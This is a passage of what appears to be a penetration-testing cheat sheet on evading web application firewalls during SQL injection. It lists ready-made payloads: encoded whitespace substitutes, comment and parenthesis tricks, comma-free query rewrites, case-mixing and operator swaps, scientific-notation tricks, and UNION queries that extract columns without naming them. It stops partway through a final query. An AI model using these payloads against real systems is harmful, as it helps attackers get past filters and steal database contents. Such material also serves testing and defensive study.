WAF Bypass

Initial bypasses from here
No spaces bypass

No Space (%20) - bypass using whitespace alternatives

    ?id=1%09and%091=1%09--
    ?id=1%0Dand%0D1=1%0D--
    ?id=1%0Cand%0C1=1%0C--
    ?id=1%0Band%0B1=1%0B--
    ?id=1%0Aand%0A1=1%0A--
    ?id=1%A0and%A01=1%A0--

No Whitespace - bypass using comments

    ?id=1/*comment*/and/**/1=1/**/--

No Whitespace - bypass using parenthesis

    ?id=(1)and(1)=(1)--

No commas bypass

No Comma - bypass using OFFSET, FROM and JOIN

    LIMIT 0,1         -> LIMIT 1 OFFSET 0
    SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
    SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d

Generic Bypasses

Blacklist using keywords - bypass using uppercase/lowercase

    ?id=1 AND 1=1#
    ?id=1 AnD 1=1#
    ?id=1 aNd 1=1#

Blacklist using keywords case insensitive - bypass using an equivalent operator

    AND   -> && -> %26%26
    OR    -> || -> %7C%7C
    =     -> LIKE,REGEXP,RLIKE, not < and not >
    > X   -> not between 0 and X
    WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))

Scientific Notation WAF bypass

You can find a more in depth explaination of this trick in gosecure blog.
Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:

    -1' or 1.e(1) or '1'='1
    -1' or 1337.1337e1 or '1'='1
    ' or 1.e('')=

Bypass Column Names Restriction

First of all, notice that if the original query and the table where you want to extract the flag from have the same amount of columns you might just do: 0 UNION SELECT * FROM flag

It’s possible to access the third column of a table without using its name using a query like the following: SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;, so in an sqlinjection this would looks like:

    # This is an example with 3 columns that will extract the column number 3
    -1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;

Or using a comma bypass:

    # In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
    -1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (
